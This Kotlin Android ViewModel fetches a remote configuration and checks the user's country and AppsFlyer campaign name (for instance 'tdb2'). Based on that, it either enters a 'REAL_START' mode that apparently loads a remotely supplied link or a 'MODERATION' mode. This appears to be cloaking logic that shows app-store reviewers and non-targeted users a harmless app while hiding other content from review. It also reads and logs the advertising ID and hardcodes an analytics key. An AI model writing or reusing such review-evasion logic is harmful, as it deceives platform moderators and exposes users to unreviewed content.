package com.aqupepgames.projectp.four.vm

import android.app.Application
import android.content.Context
import android.content.SharedPreferences
import android.util.Log
import android.widget.Toast
import androidx.lifecycle.LiveData
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.aqupepgames.projectp.four.data.CodeData
import com.aqupepgames.projectp.four.data.VillainData
import com.aqupepgames.projectp.four.repo.CountryRepo
import com.aqupepgames.projectp.four.repo.DevRepo
import com.aqupepgames.projectp.four.utils.Constant
import com.aqupepgames.projectp.four.utils.Constant.userCo
import com.aqupepgames.projectp.four.utils.SortClass
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class ViewMainModel(private val mainRepository: CountryRepo, private val devRepo: DevRepo, private val shP: SharedPreferences, private val application: Application
): ViewModel() {

    private val _advertisingIdClient = MutableLiveData<String>()
    val advertisingIdClient: LiveData<String>
        get() = _advertisingIdClient


    private val _couData = MutableLiveData<String>()
    val couData: LiveData<String>
        get() = _couData

    private val _linka = MutableLiveData<String>()
    val linka: LiveData<String>
        get() = _linka

    private val _apppppsCh = MutableLiveData<String>()
    val appsCh: LiveData<String>
        get() = _apppppsCh

    private val _geoC = MutableLiveData<String>()
    val geoC: LiveData<String>
        get() = _geoC

    private val _villainAnswer = MutableLiveData<VillainData?>()
    val villainAnswer: LiveData<VillainData?>
        get() = _villainAnswer

    private val _countryAnswer = MutableLiveData<CodeData?>()
    val countryAnswer: LiveData<CodeData?>
        get() = _countryAnswer

    private var _currentMode = MutableLiveData<SortClass>()
    val currentMode: LiveData<SortClass>
        get() = _currentMode

    init {
        viewModelScope.launch(Dispatchers.IO) {
            getAdvertisingIdClient()
        }
    }


    suspend fun getData(): String {
        val result = mainRepository.getDat().body()!!.countryCode
        _couData.postValue(result)
        return result
    }

    suspend fun getDataVil(): VillainData {

        val res = devRepo.getDataDev().body()
        val linka = devRepo.getDataDev().body()?.view.toString()


        shP.edit().putString(Constant.link, linka).apply()
        shP.edit().putString(Constant.appsCheckChe, res!!.appsChecker).apply()



        return res


    }


    val jobMain: Job = GlobalScope.launch {

            val vilGeo = getDataVil().geo
            val userGeo = getData()
            val check = getDataVil().appsChecker



            Log.d("DataCheckGrek", "checkGrek: $check, $vilGeo, $userGeo")

            var appsCamp: String? = shP.getString(Constant.C1, null)
            val executorService = Executors.newSingleThreadScheduledExecutor()


            when (check) {
                "1" ->
                    executorService.scheduleAtFixedRate({
                        if (appsCamp != null) {
                            executorService.shutdownNow()
                            Log.d("AppsChecker", "$appsCamp ")
                            if (appsCamp!!.contains("tdb2") || vilGeo.contains(userGeo)) {
                                _currentMode.postValue(SortClass.REAL_START)
                                Log.d("VIEWMODEL", "checkGrek: ${currentMode.value.toString()}")
                            } else {
                                _currentMode.postValue(SortClass.MODERATION)
                                Log.d("VIEWMODEL", "checkGrek: ${currentMode.value.toString()}")
                            }
                        } else {
                            appsCamp = shP.getString(Constant.C1, null)
                            Log.d("AppsCheckerNulled", "$appsCamp")
                        }
                    }, 0, 1, TimeUnit.SECONDS)
                else ->
                    if (userGeo.let { vilGeo.contains(it) }) {
                        _currentMode.postValue(SortClass.REAL_START_NO_APPS)
                        Log.d("VIEWMODEL", "checkGrek: ${currentMode.value.toString()}")
                    } else {
                        _currentMode.postValue(SortClass.MODERATION)
                        Log.d("VIEWMODEL", "checkGrek: ${currentMode.value.toString()}")
                    }
            }

        }




    private fun getAdvertisingIdClient() {
        val advertisingIdClient = AdvertisingIdClient(application)
        advertisingIdClient.start()
        val idUserAdvertising = advertisingIdClient.info.id
//        _advertisingIdClient.postValue(idUserAdvertising)
        shP.edit().putString(Constant.MAIN_ID, idUserAdvertising).apply()
        Log.d("getAdID", "getAdId: $idUserAdvertising")

    }

     fun initAppsFlyerLib(context: Context) {
        AppsFlyerLib.getInstance()
            .init("FuAe4RZRjun4qN3szzKekD", conversionDataListener, application)
        AppsFlyerLib.getInstance().start(context)
    }

    val conversionDataListener = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            val dataGotten = data?.get("campaign").toString()
            shP.edit().putString(Constant.C1, dataGotten).apply()
        }
        override fun onConversionDataFail(p0: String?) {}
        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
        override fun onAttributionFailure(p0: String?) {}
    }
}
